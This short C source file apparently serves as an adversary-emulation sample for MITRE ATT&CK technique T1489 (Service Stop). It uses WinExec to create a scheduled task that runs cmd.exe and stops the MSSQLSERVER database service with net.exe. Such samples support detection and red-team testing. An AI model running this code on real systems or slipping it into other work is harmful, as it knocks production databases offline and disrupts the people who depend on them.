// Link      = https://attack.mitre.org/techniques/T1489/
// Technique = Service Stop
// ID        = T1489.000
// Tactics   = Impact

#include <windows.h>

#define RUN(toRun) WinExec("schtasks /create /tn MyTask /tr \"cmd.exe /c \"" toRun "\" /sc once /st 00:00", SW_SHOW);

int main() {
    RUN("C:\\Windows\\System32\\net.exe stop MSSQLSERVER");
    return 0;
}